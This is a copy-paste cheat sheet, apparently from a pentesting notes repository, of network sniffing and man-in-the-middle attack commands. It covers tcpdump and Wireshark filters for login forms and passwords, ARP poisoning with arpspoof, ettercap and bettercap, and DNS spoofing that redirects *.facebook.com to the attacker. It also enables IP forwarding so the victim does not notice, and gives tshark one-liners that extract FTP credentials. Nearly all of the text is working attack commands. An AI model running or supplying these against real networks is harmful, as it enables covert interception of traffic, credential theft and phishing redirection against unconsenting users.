# 07 Sniffing — copy-paste commands

> Replace `<IF>` with your interface (e.g. `eth0`). `<VICTIM>` and `<GW>` are IPs.

## tcpdump — fast CLI capture

```bash
# List interfaces
tcpdump -D

# Capture everything on eth0 to a file
sudo tcpdump -i <IF> -w capture.pcap

# Read back
tcpdump -r capture.pcap -nn | less

# Capture only HTTP
sudo tcpdump -i <IF> -w http.pcap 'tcp port 80'

# Host filter
sudo tcpdump -i <IF> host 10.10.10.5 -w host.pcap

# Show packet contents (ASCII)
sudo tcpdump -i <IF> -A 'tcp port 80'
```

→ See [tcpdump.md](../tools/tcpdump.md)

## Wireshark — the filters that matter

```
http.request.method == "POST"         # login forms
http.host contains "login"            # narrow to login pages
ftp.request.command == "USER" or ftp.request.command == "PASS"
dns.qry.name contains "example"
frame contains "password"
tcp.stream eq 3                       # isolate one conversation
ip.src == 10.10.10.5 and tcp.port == 445
```

**Extract files from pcap:** `File → Export Objects → HTTP / SMB / TFTP / DICOM`

**Follow a stream:** right-click packet → `Follow → TCP Stream` (or `HTTP Stream`)

→ See [wireshark.md](../tools/wireshark.md)

## Enable IP forwarding (REQUIRED before MITM)

```bash
sudo sysctl -w net.ipv4.ip_forward=1
# Verify
cat /proc/sys/net/ipv4/ip_forward     # should print 1
```

Without this, your victim loses internet and knows something is wrong.

## arpspoof — simplest ARP poison

```bash
# Tell the victim we are the gateway
sudo arpspoof -i <IF> -t <VICTIM> <GW>

# In a SECOND terminal, tell the gateway we are the victim
sudo arpspoof -i <IF> -t <GW> <VICTIM>

# Now run wireshark / tcpdump on <IF> to capture the victim's traffic
```

## dnsspoof — forge DNS replies

```bash
cat > hosts.txt <<EOF
*.facebook.com  <LHOST>
login.example.com  <LHOST>
EOF

sudo dnsspoof -i <IF> -f hosts.txt
```

(Only works while arpspoof is running and IP forwarding is on.)

## ettercap — GUI MITM

```bash
sudo ettercap -G
# 1. Sniff → Unified sniffing → pick eth0
# 2. Hosts → Scan for hosts
# 3. Hosts → Hosts list
# 4. Add victim → Target 1.  Add gateway → Target 2.
# 5. Mitm → ARP poisoning → Sniff remote connections ✓
# 6. Start → Start sniffing
```

CLI one-shot:
```bash
sudo ettercap -Tq -i <IF> -M arp:remote /<VICTIM>// /<GW>//
```

→ See [ettercap.md](../tools/ettercap.md)

## bettercap — modern MITM

```bash
sudo bettercap -iface <IF>

# Inside the bettercap prompt:
> net.probe on
> net.show
> set arp.spoof.targets <VICTIM>
> arp.spoof on
> net.sniff on
# For DNS spoof:
> set dns.spoof.domains *.example.com
> set dns.spoof.address <LHOST>
> dns.spoof on
```

→ See [bettercap.md](../tools/bettercap.md)

## Quick pcap triage one-liners

```bash
# All HTTP URLs visited
tshark -r cap.pcap -Y "http.request" -T fields -e http.host -e http.request.uri

# All DNS queries
tshark -r cap.pcap -Y "dns.qry.name" -T fields -e dns.qry.name | sort -u

# Credentials in FTP
tshark -r cap.pcap -Y "ftp.request.command == USER or ftp.request.command == PASS" -T fields -e ftp.request.arg

# Conversations summary
tshark -r cap.pcap -q -z conv,tcp
```
